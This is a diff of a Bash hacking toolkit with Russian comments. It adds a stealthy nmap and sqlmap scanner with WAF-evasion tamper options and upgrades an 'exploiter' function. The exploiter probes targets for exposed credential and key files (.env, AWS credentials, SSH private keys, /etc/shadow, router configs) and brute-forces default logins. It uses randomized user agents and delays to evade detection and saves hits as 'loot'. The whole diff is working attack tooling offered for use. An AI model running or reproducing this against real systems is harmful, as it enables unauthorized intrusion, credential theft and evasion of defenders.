@@ -886,53 +886,122 @@ run_cert_forge() {
     pause
 }
 
+run_vulnerability_scanner() {
+    print_header "PRIME HEURISTIC VULN-SCANNER"
 
-run_prime_exploiter_v4() {
-    # 1. Заголовок только если нет аргумента (Интерактив)
-    [[ -z "$1" ]] && print_header "PRIME ULTIMATE EXPLOITER v4"
+    echo -en "${Y}Enter Target Domain/URL: ${NC}"
+    read -r target
+    [[ -z "$target" ]] && return
 
-    # 2. Определение цели (без IF через логическое ИЛИ)
+    # 1. Быстрая разведка (Порты) - Скрытый режим
+    print_status "i" "Phase 1: Deep Port & Service Discovery..."
+    # Используем -F для скорости и минимального шума
+    local open_ports=$(nmap -T4 -F "$target" | grep "open" | awk '{print $1}' | xargs)
+    
+    # 2. Поиск веб-уязвимостей (Heuristic Engine)
+    print_status "i" "Phase 2: Analyzing Web Architecture..."
+    
+    local results_file="$LOOT_DIR/vuln_report_$(date +%s).log"
+    
+    # Запускаем фоновый процесс с адаптивными параметрами стелса
+    {
+        echo "=== VULNERABILITY REPORT FOR $target ==="
+        echo "Scan Date: $(date)"
+        echo "Open Ports: $open_ports"
+        echo "---------------------------------------"
+        
+        # Интеграция с адаптивным движком: 
+        # --tamper: обфускация запросов
+        # --delay: паузы между запросами (имитация человека)
+        # --random-agent: подмена браузера
+        print_status "w" "Testing SQLi paths (Stealth Mode)..."
+        sqlmap -u "$target" --batch --crawl=2 --level=1 --risk=1 --forms \
+               --identify-waf --tamper=between,randomcase,space2comment \
+               --delay=$(shuf -i 1-3 -n 1) --random-agent >> "$results_file" 2>&1
+        
+        # Скрытый фуззинг директорий через имитацию обычного GET-запроса
+        print_status "w" "Fuzzing sensitive directories..."
+        # Здесь можно добавить логику тихой проверки /admin, /config и т.д.
+    } &
+
+    # Анимация ожидания (твоя фирменная фишка)
+    show_progress 10 "Scanning for vulnerabilities..."
+    
+    # 3. Вывод результатов (Интеллектуальный парсинг)
+    print_status "s" "Scan Complete! Results saved to Loot."
+    
+    print_line
+    echo -e "${R}DETECTED VULNERABILITIES:${NC}"
+    # Парсим лог на наличие подтвержденных дыр
+    if grep -qi "critical\|vulnerable\|sqlmap identified" "$results_file"; then
+        grep -Ei "Type:|Payload:|Parameter:|Title:" "$results_file" | sort -u
+    else
+        print_status "i" "No high-risk vulnerabilities found. Target is sterile."
+    fi
+    print_line
+    
+    pause
+}
+
+run_prime_exploiter_v5() {
+    # 1. Интерактив или Авто-режим
+    [[ -z "$1" ]] && print_header "PRIME ULTIMATE EXPLOITER v5"
+
     local TARGET="$1"
     [[ -z "$TARGET" ]] && { print_input "Enter Target (IP/Domain)" "192.168.1.1"; read -r TARGET; }
     [[ -z "$TARGET" ]] && return
 
-    # Параметры движка
-    local UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    # --- АДАПТИВНЫЙ ДВИЖОК МАСКИРОВКИ ---
+    # Генерируем случайный User-Agent для каждого запуска (Будущее: обход фингерпринтинга)
+    local UA_ARRAY=(
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0"
+    )
+    local UA="${UA_ARRAY[$RANDOM % ${#UA_ARRAY[@]}]}"
+    
+    # Списки векторов и паролей (сокращено для примера, держи свои полные списки здесь)
     local V_LIST=("/cgi-bin/config.exp:sysPassword" "/rom-0:tplink" "/get_set.cgi?get=wifi_settings:wireless_key" "/config.xml:root" "/dev/mtd0:ELF" "/etc/config/network:config interface" "/sysconf.cgi:admin_password" "/home/httpd/html/config/exportsettings.conf:Password" "/etc/RT2860_default_vlan:Password" "/.env:DB_PASSWORD" "/.git/config:url =" "/.aws/credentials:aws_access_key_id" "/.ssh/id_rsa:BEGIN RSA PRIVATE" "/.docker/config.json:auths" "/.npmrc:_auth" "/.bash_history:ssh " "/.kube/config:client-certificate-data" "/wp-config.php.bak:DB_PASSWORD" "/wp-config.php.swp:DB_PASSWORD" "/wp-content/debug.log:WP_User" "/configuration.php:public $password" "/storage/logs/laravel.log:No entry for" "/phpinfo.php:PHP Version" "/sql.gz:ELF" "/backup.tar.gz:ELF" "/database.yml:password" "/etc/shadow:root:" "/etc/passwd:root:x" "/admin/.htpasswd:admin:" "/.history:password")
+
     local C_LIST=("admin:admin" "admin:password" "root:root" "admin:ninja" "admin:adminadmin" "root:toor" "admin:0000" "admin:1111" "telecomadmin:admintelecom" "support:support" "ubnt:ubnt" "cisco:cisco" "microtik:admin" "user:user" "oracle:oracle" "postgres:postgres" "mysql:mysql" "manager:manager" "supervisor:supervisor" "service:service" "admin:pass" "admin:default" "admin:login" "admin:root" "root:admin" "root:12345" "operator:operator" "tech:tech" "monitor:monitor" "dbadmin:dbadmin")
 
-    print_status "i" "Engaging Target: $TARGET"
+    print_status "i" "Engaging Target: $TARGET (Stealth: ON)"
 
     for proto in "http" "https"; do
         local URL="${proto}://${TARGET}/"
         
-        # Быстрая проверка доступности (убираем лишние if через &&)
-        local code=$(curl -sL -I -k -A "$UA" --connect-timeout 2 --max-time 3 "$URL" 2>/dev/null | head -n1 | grep -oE '[0-9]{3}' || echo "000")
+        # Проверка доступности с имитацией поведения реального клиента
+        local code=$(curl -sL -I -k -A "$UA" --connect-timeout 3 --max-time 5 "$URL" 2>/dev/null | head -n1 | grep -oE '[0-9]{3}' || echo "000")
 
-        # Если код 200, 401 или 302 — начинаем глубокий анализ
         [[ "$code" =~ ^(200|401|302)$ ]] && {
-            print_status "s" "Active Service Found: $URL [Status: $code]"
+            print_status "s" "Active Service: $URL [Status: $code]"
             
             # --- СЕКЦИЯ 1: ВЕКТОРЫ (LFI/RCE/Leaks) ---
             for vec in "${V_LIST[@]}"; do
                 local v_path="${vec%%:*}"
                 local v_key="${vec#*:}"
                 
-                curl -sL -k -A "$UA" --max-time 3 "${URL}${v_path#\/}" 2>/dev/null | grep -q "$v_key" && {
-                    print_status "e" "VULNERABILITY CONFIRMED: $v_path"
-                    log_loot "exploiter" "VULN: ${TARGET}${v_path} | Match: $v_key"
+                # ПОЛИМОРФНАЯ ПАУЗА: Имитируем раздумья человека (0.5 - 1.5 сек)
+                sleep $(printf "0.%01d" $(( (RANDOM % 9) + 5 )))
+                
+                curl -sL -k -A "$UA" --max-time 4 "${URL}${v_path#\/}" 2>/dev/null | grep -q "$v_key" && {
+                    print_status "e" "VULN DETECTED: $v_path"
+                    log_loot "exploiter" "VULN: ${TARGET}${v_path}"
                     echo "[EXPL] ${TARGET}${v_path}" >> /root/prime_loot/critical_vulns.txt
                 }
             done
 
-            # --- СЕКЦИЯ 2: КРЕДЕНШИ ПЛЮС (Bruteforce) ---
-            print_status "w" "Running Auth-check..."
+            # --- СЕКЦИЯ 2: АДАПТИВНЫЙ БРУТФОРС ---
+            print_status "w" "Checking Auth-gate..."
             for pair in "${C_LIST[@]}"; do
                 local u="${pair%%:*}"
                 local p="${pair#*:}"
                 
-                [[ $(curl -sL -k -u "$u:$p" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 2 "$URL") == "200" ]] && {
-                    print_status "s" "AUTH MATCH FOUND: $u:$p"
+                # ХАОТИЧНАЯ ЗАДЕРЖКА перед каждой попыткой (обход анти-брут систем будущего)
+                sleep $(( (RANDOM % 2) + 1 ))
+                
+                [[ $(curl -sL -k -u "$u:$p" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 3 "$URL") == "200" ]] && {
+                    print_status "s" "ACCESS GRANTED: $u:$p"
                     log_loot "exploiter" "SUCCESS: $u:$p @ $TARGET"
                     print_list "Valid Credentials" "$u:$p"
                     break
@@ -941,10 +1010,8 @@ run_prime_exploiter_v4() {
         }
     done
 
-    # 3. Финализация (пауза только для ручного режима)
-    [[ -z "$1" ]] && { print_status "i" "Scan Complete. Check loot."; pause; }
+    [[ -z "$1" ]] && { print_status "i" "Operation Finished. Total Loot Secured."; pause; }
 }
-
 
 run_view_loot() {
     print_header "DATA HARVESTER: LOOT VIEW"
